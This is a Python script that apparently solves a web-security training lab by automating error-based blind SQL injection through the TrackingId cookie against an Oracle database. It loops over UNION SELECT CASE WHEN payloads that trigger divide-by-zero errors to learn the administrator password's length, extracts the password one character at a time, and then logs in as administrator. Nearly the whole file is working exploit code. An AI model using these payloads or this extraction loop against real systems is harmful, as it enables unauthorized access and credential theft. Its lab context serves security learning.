from ...utils import *
import string


def solve_lab(session):
    print_info(
        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
        }
        resp = session.get_path("/", cookies=cookies)

        if resp.status_code == 200:
            print_info_secondary(f"{len_pass} => 200", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => {resp.status_code}\n")
            break

    print_info(
        f'Determining administrator password by visting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
            }
            resp = session.get_path("/", cookies=cookies)

            if resp.status_code == 200:
                print_info_secondary(
                    f"{i+1}, '{c}' => 200 | Progress: {password}...", end=""
                )
            else:
                print_success(
                    f"{i+1}, '{c}' => {resp.status_code} | Progress: {password}...",
                    end="",
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    session.login("administrator", password)
